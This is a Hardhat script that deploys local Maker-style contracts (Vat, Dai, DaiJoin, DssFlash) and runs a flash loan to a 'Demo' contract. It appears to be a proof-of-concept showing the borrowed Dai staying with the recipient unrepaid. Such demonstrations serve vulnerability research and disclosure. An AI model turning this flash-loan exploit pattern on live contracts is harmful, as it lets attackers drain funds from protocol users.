// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
  const usr = hre.ethers.Wallet.createRandom().address;
  
  const vat = await hre.ethers.deployContract("Vat");
  await vat.waitForDeployment();
  console.log("Vat deployed");

  const dai = await hre.ethers.deployContract("Dai", [1]);
  await dai.waitForDeployment();
  console.log("Dai deployed");

  const daiJoin = await hre.ethers.deployContract("DaiJoin", [vat, dai]);
  await daiJoin.waitForDeployment();
  console.log("Dai join deployed");

  const flash = await hre.ethers.deployContract("DssFlash", [daiJoin]);
  await flash.waitForDeployment();
  const flashAddr = await flash.getAddress();
  await vat.setDai(flashAddr, 4257695251148025298346511078n);

  console.log("Flash deployed ", flashAddr);

  const demo = await hre.ethers.deployContract("Demo", []);
  const demoAddr = await demo.getAddress();
  await demo.waitForDeployment();
  console.log("Demo deployed", demoAddr);

  await vat.rely(flashAddr);
  await flash.file(hre.ethers.encodeBytes32String("max"), 4257695251148025298346511078n);
  await flash.vatDaiFlashLoan(demoAddr, 4257695251148025298346511078n, hre.ethers.randomBytes(0));

  await new Promise(r => setTimeout(r, 2000));

  console.log("The dai borrowed is not repayed and stays in the recipient. ", await vat.dai(demoAddr));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
